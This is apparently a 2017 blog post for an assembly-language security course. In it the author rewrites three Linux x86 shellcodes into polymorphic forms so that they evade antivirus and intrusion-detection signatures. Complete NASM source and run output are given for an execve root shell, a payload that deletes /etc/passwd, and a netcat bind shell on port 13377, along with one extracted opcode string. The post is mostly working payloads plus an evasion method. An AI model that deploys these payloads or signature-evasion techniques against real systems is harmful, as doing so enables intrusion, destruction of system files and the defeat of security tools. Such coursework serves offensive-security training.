---
layout: post
title:  "SLAE Assignment 6 - Polymorphic shellcodes"
date:   2017-04-29
category: Certification
excerpt_separator: <!--more-->
hidden: true
---
<br />
Student **SLAE - 891**  
Github: [https://github.com/phackt/slae](https://github.com/phackt/slae)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
  
### Assignment 6:  
    
**Our Goal:**  
> *Take up 3 shellcodes from Shell-Storm and create polymorphic versions*
 - *The polymorphic versions can not be larger than 150% of the original versions*
 - *Bonus points if shorter in length than original*  
<!--more-->
  
Hello everybody,  
  
So today we will create some polymorphic versions of existing shellcodes on the well-known site [shell-storm](http://shell-storm.org/shellcode/).  
Polymorphic versions aims at defeating pattern matching by AV and IDS:  
 - Replacing instructions with equivalent ones.
 - Add garbage instructions that will not change the shellcode functionality but create a mess for the AV analysis.  
  
[VirusTotal](https://www.virustotal.com/) gathers AV engines but i do not recommend to test your shellcode on it because it will be fingerprinted and may be added to their database, so your next NSA hack may fail, such a pity.  
<br />
### jmp/call/pop execve shell:  
  
Ok so for our first shellcode [execve.nasm](https://github.com/phackt/slae/tree/master/assignment6/execve/execve.nasm) let's have a look at a [jmp/call/pop execve shellcode](http://shell-storm.org/shellcode/files/shellcode-863.php) (52 bytes long):  
```nasm
global _start

section .text
_start:
    jmp short here

me:
    pop esi
    mov edi,esi
    
    xor eax,eax
    push eax
    mov edx,esp
    
    push eax
    add esp,3
    lea esi,[esi +4]
    xor eax,[esi]
    push eax
    xor eax,eax
    xor eax,[edi]
    push eax
    mov ebx,esp 

    xor eax,eax
    push eax
    lea edi,[ebx]
    push edi
    mov ecx,esp

    mov al,0xb
    int 0x80

here:
    call me
    path db "//bin/sh"
```
  
Let's execute the shellcode:  
```bash
# ./compile.sh execve && chmod u+x ./execve && ./execve
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
  
The advantage of this shellcode is that the opcodes have been already thought to obfuscate a bit the shellcode behavior. If we add a second layer we can be barely sure that the shellcode will bypass the majority of the AVs.  A good idea here is to obfuscate the **//bin/sh** variable and to add some garbage opcodes and/or to mix them.  
  
So let's have a look at our polymorphic shellcode [execve_polymorphic.nasm](https://github.com/phackt/slae/tree/master/assignment6/execve/execve_polymorphic.nasm):  
```nasm
global _start

section .text
_start:
    jmp short here

me:
    mov dword esi, [esp]    ; equivalent to mov the @ of our encoded //bin/sh into esi
    pop edi                 ; same @ in edi
    
    push 0x1                ; mix a little bit the opcodes
    pop eax
    dec eax
    push eax
    mov edx,esp

    xor ecx, ecx
    mov cl, 0x7             ; //bin/sh is 7 bytes long

dec1:                       
    mov eax, [edi + ecx]    ; we are looping on our string
    dec eax                 ; decrement the value
    mov [edi + ecx], eax    ; setting the right char into memory
    dec cl
    jns dec1                ; jump if not signed

    xor eax, eax            ; here we go for setting the right argument for our execve syscall
    push eax
    add esp,3
    lea esi,[esi+6]
    xor eax,[esi-2]

    push eax
    xor eax,eax
    xor eax,[edi]
    push eax
    mov ebx,esp 

    xor eax,eax
    push eax
    lea edi,[ebx]
    push edi
    mov ecx,esp

    mov al,0xb              ; int execve(const char *filename, char *const argv[],char *const envp[]);

    int 0x80

here:
    call me
    path db 0x30,0x30,0x63,0x6a,0x6f,0x30,0x74,0x69 ; encoded //bin/sh string, we added 1 to each byte
```
  
Let's compile our polymorphic shellcode:  
```bash
# ./compile.sh execve_polymorphic
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
# objdump -d ./execve_polymorphic|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x3a\x8b\x34\x24\x5f\x6a\x01\x58\x48\x50\x89\xe2\x31\xc9\xb1\x07\x8b\x04\x0f\x48\x89\x04\x0f\xfe\xc9\x79\xf5\x31\xc0\x50\x83\xc4\x03\x8d\x76\x06\x33\x46\xfe\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xc1\xff\xff\xff\x30\x30\x63\x6a\x6f\x30\x74\x69"
```
  
Let's run it into [shellcode.c](https://github.com/phackt/slae/tree/master/assignment6/execve/shellcode.c):  
```bash
# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c && ./shellcode
Shellcode Length:  73
# id
uid=0(root) gid=0(root) groups=0(root)
```
  
Our polymorphic shellcode is 73 bytes so we are under the 52 * 1.5 = 78 bytes, perfect.  
<br />
### unlink /etc/passwd shellcode:  
  
For this second shellcode let's have a look at a [shellcode](http://shell-storm.org/shellcode/files/shellcode-560.php) that aims at unlinking the critical /etc/passwd file.  A quick ``` man 2 unlink ``` provides this information: ***unlink()** deletes a name from the filesystem.*.  Great, but please don't forget to backup your /etc/passwd file.  
    
Let's compile and debug thanks to gdb:  
```bash
# gcc -fno-stack-protector -z execstack -o unlink unlink.c && chmod u+x ./unlink && ./unlink
Shellcode Length: 35
# ls -lrt /etc/passwd*
-rw------- 1 0 root 3025 mars   1 21:47 /etc/passwd-
-rw-r--r-- 1 0 root 3073 avril 22 13:48 /etc/passwd.backup
```  
  
Ok so we have our passwd backups but the */etc/passwd* file has been deleted.  Let's have a look to the shellcode (35 bytes long):  
```bash
# gdb -q unlink
Reading symbols from unlink...(no debugging symbols found)...done.
gdb-peda$ print &shell
$1 = (<data variable, no debug info> *) 0x804a040 <shell>
gdb-peda$ br *&shell
Breakpoint 1 at 0x804a040
gdb-peda$ r
Starting program: /root/Documents/pentest/certs/slae/exam/assignment6.2/unlink 
Shellcode Length: 35
[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0x315e11eb 
EBX: 0x0 
ECX: 0x7fffffeb 
EDX: 0xb7faf870 --> 0x0 
ESI: 0x1 
EDI: 0xb7fae000 --> 0x1b2db0 
EBP: 0xbffff238 --> 0x0 
ESP: 0xbffff21c --> 0x8048479 (<main+62>: mov    eax,0x0)
EIP: 0x804a040 --> 0x315e11eb
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03a: add    BYTE PTR [eax],al
   0x804a03c: add    BYTE PTR [eax],al
   0x804a03e: add    BYTE PTR [eax],al
=> 0x804a040 <shell>: jmp    0x804a053 <shell+19>
 | 0x804a042 <shell+2>: pop    esi
 | 0x804a043 <shell+3>: xor    eax,eax
 | 0x804a045 <shell+5>: xor    ecx,ecx
 | 0x804a047 <shell+7>: xor    edx,edx
 |->   0x804a053 <shell+19>:  call   0x804a042 <shell+2>
       0x804a058 <shell+24>:  das
       0x804a059 <shell+25>:  gs je  0x804a0bf
       0x804a05c <shell+28>:  das
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xbffff21c --> 0x8048479 (<main+62>:  mov    eax,0x0)
0004| 0xbffff220 --> 0x1 
0008| 0xbffff224 --> 0xbffff2e4 --> 0xbffff480 ("/root/Documents/pentest/certs/slae/exam/assignment6.2/unlink")
0012| 0xbffff228 --> 0xbffff2ec --> 0xbffff4bd ("XDG_VTNR=2")
0016| 0xbffff22c --> 0x804a040 --> 0x315e11eb 
0020| 0xbffff230 --> 0xb7fae3dc --> 0xb7faf1e0 --> 0x0 
0024| 0xbffff234 --> 0xbffff250 --> 0x1 
0028| 0xbffff238 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804a040 in shell ()
gdb-peda$ x/17i $eip
=> 0x804a040 <shell>: jmp    0x804a053 <shell+19>
   0x804a042 <shell+2>: pop    esi
   0x804a043 <shell+3>: xor    eax,eax
   0x804a045 <shell+5>: xor    ecx,ecx
   0x804a047 <shell+7>: xor    edx,edx
   0x804a049 <shell+9>: mov    al,0xa
   0x804a04b <shell+11>:  mov    ebx,esi
   0x804a04d <shell+13>:  int    0x80
   0x804a04f <shell+15>:  mov    al,0x1
   0x804a051 <shell+17>:  int    0x80
   0x804a053 <shell+19>:  call   0x804a042 <shell+2>
   0x804a058 <shell+24>:  das    
   0x804a059 <shell+25>:  gs je  0x804a0bf
   0x804a05c <shell+28>:  das    
   0x804a05d <shell+29>:  jo     0x804a0c0
   0x804a05f <shell+31>:  jae    0x804a0d4
   0x804a061 <shell+33>:  ja     0x804a0c7
gdb-peda$
```
  
So we can see a jmp/call/pop technique setting the string for the syscall **0xa** (int unlink(const char *pathname);). Then a syscall to the exit function. Debugging just after the **pop esi**:  
```bash
gdb-peda$ x/s $esi
0x804a058 <shell+24>: "/etc/passwd"
```
  
Let's create our polymorphic shellcode:  
```nasm
global _start

section .text
_start:
    jmp short here

me:
    pop ebx          ; Directly pop the @ of /etc/passwd into ebx

    xor ecx,ecx
    mul ecx          ; This instruction will cause both EAX and EDX to become zero
    
    mov cl,0x1
    mov al,0xb
    sub al,cl        ; Equivalent to mov al,0xa
    int 0x80         ; int unlink(const char *pathname);
    
    mov al,cl        ; Equivalent to mov al,0x1
    int 0x80         ; void _exit(int status);
    call me

here:
    call me
    path db "/etc/passwd"
```
  
Let's run it:  
```bash
# touch /etc/passwd
# ./compile.sh unlink_polymorphic && ./unlink_polymorphic
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
# ls /etc/passwd
ls: impossible d'accéder à '/etc/passwd': Aucun fichier ou dossier de ce type
```  
  
Here we go, our new polymorphic shellcode did the job and is **40 bytes** long.  
<br />
### netcat bin shellcode:  
  
Here we go for our last shell-storm shellcode. We will use this [shellcode](http://shell-storm.org/shellcode/files/shellcode-804.php) which is calling netcat to bind a shell on port 13377.  
  
Let's assembly, link and execute [netcat_bind.nasm](https://github.com/phackt/slae/tree/master/assignment6/netcat/netcat_bind.nasm) (**64 bytes** long):    
```bash
# ./compile.sh netcat_bind
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
# ./netcat_bind 
listening on [any] 13377 ...
```
  
Then from another shell:  
```bash
# nc 127.0.0.1 13377
id
uid=0(root) gid=0(root) groups=0(root)
```
  
Perfect, everything is working fine, so let's mix up this opcodes in our [netcat_bind_polymorphic.nasm](https://github.com/phackt/slae/tree/master/assignment6/netcat/netcat_bind_polymorphic.nasm):  
```nasm
section .text
    global _start
_start:
  xor ecx,ecx
  mul ecx          ; mul technique to clear out EAX and EDX
  
  jmp short arg1   ; jmp/call/pop technique

poptag1:
    pop edx          ; replace the push opcode
    push eax

  push 0x68732f6e
  push 0x69622f65
  push 0x76766c2d
  mov ecx,esp

  push eax
  push 0x636e2f2f
  push 0x2f2f2f2f
  push 0x6e69622f
  mov ebx, esp

  push eax
  push edx
  push ecx
  push ebx
  
  mov edx,eax      ; replace the xor opcode
  mov  ecx,esp
  mov al,11        ; execve syscall
  int 0x80

arg1:
  call poptag1
  string1 db "-vp13377"
```
  
Let's assembly, link, and execute:  
```bash
# ./compile.sh netcat_bind_polymorphic && ./netcat_bind_polymorphic
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
listening on [any] 13377 ...

```
  
From another shell:  
```bash
# nc 127.0.0.1 13377
id
uid=0(root) gid=0(root) groups=0(root)
```
  
Perfect it works and our new shellcode is **68 bytes** long.  
We saw in this article that we can create some polymorphic versions of well known shellcodes in order to bypass the known signatures of these shellcodes.  
  
Hope you enjoyed this post, see you soon for our last assignment.  
Bye,  
  
[Phackt](https://twitter.com/phackt_ul)